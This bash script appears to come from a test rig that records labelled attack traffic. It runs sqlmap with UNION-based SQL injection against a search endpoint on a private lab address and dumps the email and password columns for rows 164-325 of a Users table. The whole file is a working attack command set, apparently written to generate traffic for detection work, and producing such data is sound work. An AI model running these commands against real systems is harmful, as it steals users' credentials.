#!/usr/bin/env bash
# ATK-08 variant g: ATK-08.c's loud shape (about 90 s of slow sqlmap probing, then a fast dump from the
# saved session, sqlmap's own user agent), but the dump takes only the second half of Users (rows
# 164-325 of 325, --start/--stop), so one harvest never takes every customer (D-63). .f is the first
# half. Runs inside the rig's tools container only (recording/record.sh).
# tool: sqlmap 1.10.11
# label: loud: slow sqlmap probing, then a fast dump of Users rows 164-325 from the saved session, sqlmap user agent
set -eu
common=(-u 'http://10.66.0.10/rest/products/search?q=apple' -p q --dbms=sqlite --technique=U
  --prefix="'))" --suffix='--' --no-cast --batch --answers='crack=N' --output-dir=/out/sqlmap)
sqlmap "${common[@]}" --delay=1.2 -t /out/traffic-1.txt
sqlmap "${common[@]}" -T Users -C email,password --dump --start=164 --stop=325 -t /out/traffic-2.txt
cat /out/traffic-1.txt /out/traffic-2.txt > /out/traffic.txt
